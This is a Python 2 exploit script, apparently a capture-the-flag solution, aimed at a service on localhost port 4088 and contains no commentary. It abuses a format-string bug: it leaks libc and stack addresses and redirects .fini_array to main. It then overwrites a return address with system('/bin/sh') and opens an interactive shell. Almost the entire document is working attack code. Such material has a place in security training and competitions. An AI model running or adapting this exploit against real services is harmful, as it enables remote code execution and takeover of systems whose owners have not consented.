import socket, struct, telnetlib


def sock(remoteip, remoteport):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((remoteip, remoteport))
    return s, s.makefile('rw', bufsize=0)


def read_until(f, delim='\n'):
    data = ''
    while not data.endswith(delim):
      data += f.read(1)
    return data


def shell(s):
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()


def p(a): return struct.pack("<I",a)
def u(a): return struct.unpack("<I",a)[0]
def p64(a): return struct.pack("<Q",a)
def u64(a): return struct.unpack("<Q",a)[0]


s, f = sock("127.0.0.1", 4088)

addr_arg_start = 0xffffc85c
addr_fini_array = 0x80496dc
addr_main = 0x804849b

buf = ''
buf += r'%267$x'
buf += r'%264$x'

# pad
buf += ' ' * (-len(buf) % 4)

offset = 7
offset += len(buf) / 4 if len(buf) % 4 == 0 else len(buf) / 4 + 1

for i in xrange(4):
    buf += p(addr_fini_array + i)

#         fsbs    target addresses
written = 8 * 2 + 4 * 4
for i, ch in enumerate(p(addr_main)):
    num_bytes = (ord(ch) - written - 1) % 256 + 1
    buf += '%{}c%{}$hhn'.format(num_bytes, offset + i)
    written += num_bytes

# Fill up buffer to flush
buf += 'AAAA'
buf += '%4096c'

f.write(buf + '\n')

output = read_until(f, 'AAAA')
output = output[output.find('RESPONSE :')+len('RESPONSE :'):]
addr_libc_start_main = int(output[:8], 16) - 247
addr_libc_base = addr_libc_start_main - 0x00018540
#addr_ret_addr = int(output[8:16], 16) - 20
addr_ret_addr = int(output[8:16], 16) - 0x524

print '[+] addr_libc_base = {}'.format(hex(addr_libc_base))
print '[+] addr_ret_addr = {}'.format(hex(addr_ret_addr))


addr_system = addr_libc_base + 0x3ada0
addr_binsh = addr_libc_base +  0x15ba0b
print '[+] addr_system = {}'.format(hex(addr_system))
print '[+] addr_binsh = {}'.format(hex(addr_binsh))

buf = ''
for i in xrange(4):
    buf += p(addr_ret_addr + i)
for i in xrange(4):
    buf += p(addr_ret_addr + 8 + i)


written = 4 * 4 * 2
offset = 7
for i, ch in enumerate(p(addr_system)):
    num_bytes = (ord(ch) - written - 1) % 256 + 1
    buf += '%{}c%{}$hhn'.format(num_bytes, offset + i)
    written += num_bytes

offset += 4
for i, ch in enumerate(p(addr_binsh)):
    num_bytes = (ord(ch) - written - 1) % 256 + 1
    buf += '%{}c%{}$hhn'.format(num_bytes, offset + i)
    written += num_bytes

f.write(buf + '\n')


shell(s)
